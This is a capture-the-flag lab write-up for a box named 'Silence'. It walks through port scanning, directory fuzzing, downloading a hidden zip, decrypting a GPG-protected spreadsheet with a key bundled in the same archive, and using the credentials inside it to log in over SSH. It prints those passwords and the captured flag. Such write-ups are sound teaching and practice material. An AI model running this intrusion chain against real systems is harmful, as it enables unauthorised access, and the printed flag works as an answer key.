# Silence

## Techniques used

- Directory fuzzing
- GPG encrypted archive decryption
- Credential reuse from an Excel file

## Tools used

- nmap
- curl
- ffuf
- unzip
- gpg
- ssh

## Commands and output

### 1. Port scan

```bash
$ nmap -Pn -sV -p- 10.10.0.52
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
```

### 2. Directory fuzzing

```bash
$ ffuf -w raft-medium-words.txt -u "http://10.10.0.52/FUZZ" -mc 200,301,302,403
```

```text
hidden                  [Status: 301]
```

### 3. Finding the archive

```bash
$ ffuf -w raft-medium-words.txt -u "http://10.10.0.52/hidden/FUZZ"
```

```text
stats.zip               [Status: 200]
```

### 4. Extracting the archive

```bash
$ curl -O http://10.10.0.52/hidden/stats.zip
$ unzip stats.zip
```

```text
ClimbersStats.xlsx.gpg
.hidden-key
```

### 5. Decrypting the file


```bash
$ gpg --import .hidden-key
$ gpg --output ClimbersStats.xlsx --decrypt ClimbersStats.xlsx.gpg
```

### 6. Reading the credentials

```text
Climber Name    Username  Password                      Max grade
Adam Ondra      adam      bibliographieSeemsTough2022    9c (Secret project)
Magnus Mitbo    magnus    youtubeIsClimbingToo           9b Ali Hulk
Janja Garnbret  janja     theClimbingMonster             9a Seleccio Natural
```

### 7. SSH login and reading user.txt

```bash
$ ssh janja@10.10.0.52
Password: theClimbingMonster
$ cat user.txt
```

```text
EPI{4d4M_0ndr4_Ch4n93_9b+}
```

## Evidence

- SSH: `janja` / `theClimbingMonster`
- Flag: `EPI{4d4M_0ndr4_Ch4n93_9b+}`
